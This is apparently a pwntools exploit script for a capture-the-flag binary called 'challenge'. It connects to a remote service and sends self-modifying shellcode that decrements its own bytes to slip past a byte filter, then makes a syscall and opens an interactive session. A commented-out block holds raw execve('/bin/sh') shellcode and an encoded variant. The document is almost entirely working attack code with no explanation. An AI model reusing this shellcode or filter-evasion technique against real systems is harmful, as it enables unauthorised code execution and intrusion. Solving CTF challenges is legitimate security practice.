from pwn import *
from icecream import ic

elf = exe = ELF("./challenge")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("152.69.210.130", 3002)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+244
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# payload = asm('''
#     mov ebx, esi

#     add ebx, 127
#     add ebx, 5
#     add ebx, 5

#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     inc ebx
#     inc ebx
#     dec dword ptr [rbx]
#     inc ebx
#     dec dword ptr [rbx]
# ''')
# b'H\xc7\xc0;\x00\x00\x00H\x8d=\x10\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05/bin/sh'
# payload += b'H\xc7\xc0;\x00\x00\x00H\x8d=\x10\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05/bin/sh\x00'
# payload += b'I\xc7\xc1;\x01\x01\x01I\x8d=\x11\x01\x01\x01I\xc7\xc7\x01\x01\x01\x01I\xc7\xc3\x01\x01\x01\x01\x0f\x05/cio/si\x01'

payload = asm('''
    mov ebx, esi
    add ebx, 127
    add ebx, 15

    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    dec dword ptr [rbx]
    inc ebx
    inc ebx
    inc ebx
''')
payload += b'I\xc7\xc7\x01\x01\x01\x01I\x81\xc7\xc1\x03\x01\x01M\x89\xf7I\xc7\xc3e\x01\x01\x01M1\xd3M1\xc1M1\xc9I\xc7\xc1-\x01\x01\x01\x0f\x05'
sl(payload)

io.interactive()